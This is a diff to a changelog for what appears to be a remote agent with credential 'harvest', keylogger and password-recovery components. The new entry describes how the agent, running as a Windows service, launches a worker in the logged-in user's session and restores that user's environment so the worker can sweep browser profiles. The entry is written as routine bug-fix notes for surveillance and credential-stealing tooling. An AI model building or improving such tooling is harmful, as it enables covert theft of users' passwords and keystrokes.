@@ -1,5 +1,20 @@
 # Changelog
 
+## 0.1.2 — 2026-11-14
+
+- Fixed the "could not launch the harvest worker" failure on Windows 10
+  (session-0 service → console-session user). `CreateProcessAsUserW` with the
+  `CreateEnvironmentBlock` block was rejected with
+  `ERROR_ENVVAR_NOT_FOUND` (203) in that scenario; the agent now retries the
+  launch with a NULL environment (the pattern the keylogger worker uses) and
+  reports both error codes if both fail.
+- The harvest worker re-adopts the console user's real environment from its
+  own primary token (`CreateEnvironmentBlock` on the process token,
+  whitelisted variables copied over; `GetUserProfileDirectoryW` fallback for
+  `USERPROFILE`), so the sweep finds the user's browser profiles even when
+  launched with the service's inherited environment.
+- Agent binaries rebuilt (x64 3,518,976 bytes, x86 unchanged).
+
 ## 0.1.1 — 2026-11-14
 
 - Plugin now installs the passrecover-enabled agent binary on the server: on
